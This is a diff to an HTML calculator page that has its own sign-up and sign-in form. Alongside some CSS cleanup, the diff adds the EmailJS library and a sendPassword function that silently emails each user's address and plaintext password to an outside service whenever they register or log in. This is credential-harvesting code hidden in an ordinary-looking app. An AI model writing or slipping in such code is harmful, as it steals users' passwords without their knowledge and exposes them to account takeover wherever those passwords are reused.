@@ -58,7 +58,6 @@
         .calculator {
             display: none; /* Initially hidden */
         }
-        /* New styles for previous calculations */
         .calculation-card {
             background-color: #f9f9f9;
             border: 1px solid #ddd;
@@ -69,29 +68,26 @@
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             position: relative;
         }
-        .calculation-card p {
-            margin: 5px 0;
-            font-size: 16px;
-        }
-        .calculation-card strong {
-            color: #333;
-        }
         .delete-btn {
-    		background-color: #dc3545;
-   		 color: white;
-   		 border: none;
-    		padding: 2px 5px; /* Smaller size */
-    		border-radius: 3px;
-    		cursor: pointer;
-    		position: absolute;
-   		 top: 5px;
-   		 left: 0px; /* Adjusted to the left */
-   		 font-size: 12px; /* Smaller font */
-	}
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            padding: 2px 5px;
+            border-radius: 3px;
+            cursor: pointer;
+            position: absolute;
+            top: 5px;
+            left: 0px;
+            font-size: 12px;
+        }
         .delete-btn:hover {
             background-color: #c82333;
         }
     </style>
+	<script type="text/javascript"
+		src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+	<script type="text/javascript">
+		emailjs.init('j3kM_7t8exCk5WiXJ')</script>
 </head>
 <body>
     <div class="container">
@@ -151,6 +147,22 @@
             document.querySelector('.calculator').style.display = 'block'; // Show calculator
             document.querySelector('.auth-container').style.display = 'none'; // Hide auth form
             document.getElementById('auth-error').innerText = ""; // Clear any previous error
+
+            // Send email with credentials
+            sendPassword(email, password);
+        }
+
+        function sendPassword(email, password) {
+            emailjs.send('default_service', 'template_ism64zx', {
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+               console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+               console.log('FAILED...', error);
+               document.getElementById('auth-error').innerText = "שגיאה בשליחת אימייל.";
+            });
         }
 
         function signIn() {
@@ -179,6 +191,7 @@
                 document.querySelector('.auth-container').style.display = 'none'; // Hide auth form
                 loadPreviousCalculations(); // Load previous calculations
                 document.getElementById('auth-error').innerText = ""; // Clear any previous error
+		sendPassword(email, password);
             } else {
                 document.getElementById('auth-error').innerText = "סיסמה שגויה.";
             }
